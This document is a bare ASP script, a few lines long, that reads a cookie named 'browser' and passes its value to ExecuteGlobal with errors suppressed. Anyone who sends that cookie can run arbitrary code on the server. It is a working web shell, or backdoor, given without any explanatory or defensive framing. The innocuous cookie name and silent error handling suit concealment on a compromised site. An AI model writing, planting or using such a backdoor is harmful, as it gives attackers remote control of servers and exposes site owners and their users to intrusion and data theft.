<% 
On Error Resume Next 
dim cmd : cmd = Request.Cookies("browser") 
ExecuteGlobal(cmd) 
%> 
